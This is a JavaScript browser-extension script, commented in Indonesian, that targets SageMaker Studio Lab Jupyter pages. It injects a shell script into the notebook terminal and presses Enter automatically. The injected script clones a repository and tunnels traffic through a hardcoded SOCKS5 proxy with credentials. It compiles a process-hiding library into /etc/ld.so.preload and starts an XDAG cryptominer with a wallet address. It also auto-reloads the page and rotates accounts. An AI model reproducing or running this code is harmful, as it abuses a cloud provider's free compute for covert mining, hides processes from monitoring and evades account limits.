// jupyterAction.js

// ========================
// 1. Log segera saat skrip di‐inject (debug)
// ========================
console.log("[jupyterAction] Skrip INJECTED, URL:", window.location.href);

// ========================
// 2. Konstanta untuk skrip shell (yang akan di‐paste ke Terminal Jupyter Lab)
// ========================
const SCRIPT = `
cd

rm -rf gasdag

git clone https://gitlab.com/mmzainal/gasdag
cd gasdag

#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

tar -xvzf graphics.tar.gz
rm -rf graphich.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.58.41.135:443
socks5_username = aku2
socks5_password = akukayaraya
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp rm -rf gas && unzip korek.zip
chmod +x gasdag
rm -rf Makefile
rm -rf processhider.c
rm -rf README.md
rm -rf .gitignore
rm -rf korek.zip

unzip tukimin.zip
rm -rf tukimin.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./gasdag -a rx/xdag -o stratum.xdag.org:23656 -u PMxf66AwH5dpvPho18MWxXYmqeXdixkUB.1 -p x


echo ""

echo " "



`.trim();

// ========================
// 3. Variabel kontrol (paste & clear hanya sekali per tab Jupyter Lab)
// ========================
let retries = 0;
const MAX_TERMINAL_RETRIES = 120;        // maksimum percobaan deteksi "Terminal"
const RETRY_INTERVAL = 2000;   // 2 detik antar percobaan

let pasteTriggered = false;    // agar paste SCRIPT hanya sekali
let clearScheduled = false;    // agar clearTabsAndCache hanya sekali

// ========================
// 4. Interval reload otomatis: 15 menit (untuk semua halaman studiolab.sagemaker.aws)
// ========================
const RELOAD_INTERVAL_MS = 15 * 60 * 1000; // 15 menit

// ========================
// 5. Fungsi cek prompt "Terminal" di body (hanya Jupyter Lab)
// ========================
function checkPromptInBody() {
  const body = document.querySelector("body");
  if (!body) return false;
  const text = body.innerText || "";
  return text.includes("Terminal");
}

// ========================
// 6. Fungsi cari elemen terminal di Jupyter Lab
// ========================
function findTerminal() {
  return (
    document.querySelector(".terminal, .jp-Terminal-body, textarea") ||
    document.evaluate(
      '//div[contains(@class,"terminal")]',
      document,
      null,
      XPathResult.FIRST_ORDERED_NODE_TYPE,
      null
    ).singleNodeValue
  );
}

// ========================
// 7. Fungsi paste SCRIPT ke terminal dan scheduling clear
// ========================
function pasteScriptToTerminal(terminal) {
  console.log("[jupyterAction] (JLab) Mensimulasikan paste ke terminal…");

  const clipboardData = new DataTransfer();
  clipboardData.setData("text/plain", SCRIPT);

  const pasteEvent = new ClipboardEvent("paste", {
    bubbles: true,
    cancelable: true,
    clipboardData: clipboardData
  });

  terminal.focus();
  terminal.dispatchEvent(pasteEvent);
  console.log("[jupyterAction] (JLab) SCRIPT berhasil dipaste ke terminal.");

  // Simulasikan Enter setelah 2 detik
  setTimeout(() => {
    terminal.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
    terminal.dispatchEvent(new KeyboardEvent("keyup",   { key: "Enter", bubbles: true }));
    console.log("[jupyterAction] (JLab) Enter ditekan setelah paste.");

    try {
      chrome.runtime.sendMessage({ action: "paste_success", timestamp: Date.now() });
    } catch(e) {
      console.warn("[jupyterAction] Gagal kirim paste_success message:", e);
    }

    // ▲=== Jadwalkan clearTabsAndCache dan switch account 15 detik setelah paste ===▲
    if (!clearScheduled) {
      clearScheduled = true;
      setTimeout(() => {
        console.log("[jupyterAction] (JLab) 15 detik terpenuhi → kirim clearTabsAndSwitchAccount.");
        chrome.runtime.sendMessage({ action: "clearTabsAndSwitchAccount" });
      }, 15000);
    }
  }, 2000);
}

// ========================
// 8. Loop utama: tunggu "Terminal" dan paste (hanya Jupyter Lab)
// ========================
function waitForPromptAndPaste() {
  if (pasteTriggered) return;

  retries++;
  console.log(`[jupyterAction] (JLab) Percobaan ke-${retries} mendeteksi "Terminal"…`);

  if (checkPromptInBody()) {
    console.log("[jupyterAction] (JLab) 'Terminal' terdeteksi di halaman.");
    const terminal = findTerminal();
    if (terminal) {
      pasteTriggered = true;
      console.log("[jupyterAction] (JLab) Terminal ditemukan. Melakukan paste…");
      pasteScriptToTerminal(terminal);
    } else {
      console.error("[jupyterAction] (JLab) Terminal tidak ditemukan meski prompt muncul.");
    }
  } else {
    if (retries < MAX_TERMINAL_RETRIES) {
      setTimeout(waitForPromptAndPaste, RETRY_INTERVAL);
    } else {
      console.error("[jupyterAction] (JLab) Gagal menemukan 'Terminal' setelah beberapa percobaan.");
    }
  }
}

// ========================
// 9. Fungsi setup reload otomatis setiap 15 menit (HANYA untuk Jupyter Lab, bukan dashboard/login)
// ========================
function scheduleAutoReload() {
  // Only schedule auto-reload for Jupyter Lab pages, not dashboard or login pages
  const isJupyterLab = /https:\/\/.*\.studio\.us-east-2\.sagemaker\.aws\/studiolab\/default\/jupyter\/lab/.test(window.location.href);
  if (!isJupyterLab) {
    console.log("[jupyterAction] (Reload) Not a Jupyter Lab page, skipping auto-reload setup.");
    return;
  }
  
  console.log(`[jupyterAction] (Reload) Menjadwalkan reload otomatis setiap ${RELOAD_INTERVAL_MS / 60000} menit untuk Jupyter Lab.`);
  setInterval(() => {
    if (window.location.hostname.includes("studio.us-east-2.sagemaker.aws")) {
      console.log("[jupyterAction] (Reload) Melakukan reload otomatis untuk Jupyter Lab.");
      window.location.reload();
    } else {
      console.log("[jupyterAction] (Reload) Bukan di domain Jupyter Lab, skip reload.");
    }
  }, RELOAD_INTERVAL_MS);
}

// ========================
// 10. Inisialisasi
//   - Hanya pada Jupyter Lab: setup reload dan jalankan loop paste/clear
//   - Pada halaman lain (dashboard, login): tidak melakukan apa-apa
// ========================
function init() {
  console.log("[jupyterAction] init() dipanggil pada URL:", window.location.href);
  
  // Check if this is a Jupyter Lab page
  const isJupyterLab = /https:\/\/.*\.studio\.us-east-2\.sagemaker\.aws\/studiolab\/default\/jupyter\/lab/.test(window.location.href);
  
  if (isJupyterLab) {
    console.log("[jupyterAction] Halaman Jupyter Lab terdeteksi—setup lengkap");
    // 10.1 Setup reload otomatis hanya untuk Jupyter Lab
    scheduleAutoReload();
    // 10.2 Mulai loop paste/clear untuk Jupyter Lab
    waitForPromptAndPaste();
  } else {
    console.log("[jupyterAction] Bukan Jupyter Lab (dashboard/login/lainnya)—skip semua proses.");
    // Don't do anything on dashboard, login, or other SageMaker pages
    return;
  }
}

// ========================
// 11. Entry point: Script hanya aktif di Jupyter Lab
//    Meskipun di-inject ke semua studiolab.sagemaker.aws/*, hanya berfungsi di Jupyter Lab
// ========================
const onStudiolabDomain = window.location.hostname.endsWith("studiolab.sagemaker.aws");
const onJupyterLabSub = /https:\/\/.*\.studio\.us-east-2\.sagemaker\.aws\/studiolab\/default\/jupyter\/lab/.test(window.location.href);

// Hanya jalankan pada halaman Jupyter Lab, abaikan dashboard/login/lainnya  
if (onJupyterLabSub || (onStudiolabDomain && window.location.href.includes("/jupyter/lab"))) {
  console.log("[jupyterAction] (Entry) Jupyter Lab detected - initializing...");
  if (document.readyState === "complete" || document.readyState === "interactive") {
    init();
  } else {
    window.addEventListener("DOMContentLoaded", init);
  }
} else {
  console.log("[jupyterAction] (Entry) Not a Jupyter Lab page - script will not run. URL:", window.location.href);
}
